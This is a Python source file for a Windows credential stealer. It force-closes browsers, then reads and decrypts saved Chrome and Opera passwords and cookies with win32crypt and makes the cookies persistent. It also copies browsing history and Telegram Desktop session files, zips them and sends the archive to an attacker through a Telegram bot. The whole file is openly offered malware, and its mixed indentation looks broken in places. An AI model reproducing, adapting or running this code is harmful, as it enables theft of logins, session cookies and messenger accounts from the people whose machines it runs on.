import re 
import zipfile 
import telepot
import os,getpass
import subprocess
import win32crypt
import time
import sqlite3
user = getpass.getuser()
z = zipfile.ZipFile(user + '.zip', 'w')  
tpath = r'C:\Users\%s\AppData\Roaming\Telegram Desktop\tdata' % user
history_chrome = r'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\History' % user
history_opera = r'C:\Users\%s\AppData\Roaming\Opera Software\Opera Stable\History' % user
chrome_path = r'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Login Data' % user
opera_path = r'C:\Users\%s\AppData\Roaming\Opera Software\Opera Stable\Login Data' % user
opera_cookie_path = r'C:\Users\%s\AppData\Roaming\Opera Software\Opera Stable\Cookies' % user
chrome_cookie_path = r'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cookies' % user
bot=telepot.Bot('*telegram api token*')
DETACHED_PROCESS = 0x00000008
subprocess.call("taskkill /f /im chrome.exe",creationflags=DETACHED_PROCESS)
subprocess.call("taskkill /f /im opera.exe",creationflags=DETACHED_PROCESS)
subprocess.call("taskkill /f /im browser.exe",creationflags=DETACHED_PROCESS)
time.sleep(4)

def decrypt(path):
    		info_list = []
    
    
    		connection = sqlite3.connect(path)
    		with connection:
          		cursor = connection.cursor()
           		v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
           		value = v.fetchall()

       

    		for origin_url, username, password in value:
        		
              		password = win32crypt.CryptUnprotectData(
                  		password, None, None, None, 0)[1]
            
        		if password:
                		info_list.append({
                    		'origin_url': origin_url,
                    		'username': username,
                    		'password': str(password)
                    	 })
        	return info_list
def output_csv(csv,info):
    		
			with open(csv, 'wb') as csv_file:
				csv_file.write('origin_url,username,password \n'.encode('utf-8'))
				for data in info:
					csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data['username'], data['password'])).encode('utf-8'))

def cookies(cookie_path):
  # Connect to the Database
    conn = sqlite3.connect(cookie_path)
    cursor = conn.cursor()

# Get the results
    cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
    for host_key, name, value, encrypted_value in cursor.fetchall():
  # Decrypt the encrypted_value
      decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0

  # Update the cookies with the decrypted value
  # This also makes all session cookies persistent
      cursor.execute('\
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\
        WHERE host_key = ?\
        AND name = ?',
      (decrypted_value, host_key, name));
    conn.commit()	
    conn.close()
if os.path.exists(chrome_path):
  csv = 'chrome.csv'
  output_csv(csv,decrypt(chrome_path))
  cookies(chrome_cookie_path)
  z.write(os.path.join(csv))
  z.write(os.path.join(history_chrome))
  z.write(os.path.join(chrome_cookie_path))
  os.remove('chrome.csv')
else:
	pass
if os.path.exists(opera_path):
  csv = 'opera.csv'
  output_csv(csv,decrypt(opera_path))
  cookies(opera_cookie_path)
  z.write(os.path.join(opera_cookie_path))
  z.write(os.path.join(csv))
  z.write(os.path.join(history_opera))
  os.remove(csv)
else:
	pass


try:
  f1 = os.listdir(tpath)
  f1 = ('').join(f1)
  f2 = os.listdir(tpath + '\\D877F783D5D3EF8C')
  f2 = ('').join(f2)
  print(f2)
  fl1 = re.findall('(D877F783D5D3EF8C\\d)',f1)
  fl2 = re.findall('(map.)',f2)
  fl1 = ('').join(fl1)
  fl2 = ('').join(fl2)
  fl1 = tpath + '\\' + fl1
  fl2 = tpath + '\\D877F783D5D3EF8C\\' + fl2
  at = []
  at.append(fl1)
  at.append(fl2)
  print(fl1)
  print(fl2)
  for file in at:
    z.write(file)
except Exception as err:
  print(err)
z.close()
archiv = open(user + '.zip','rb')
bot.sendDocument('*telegram acount id*',archiv)
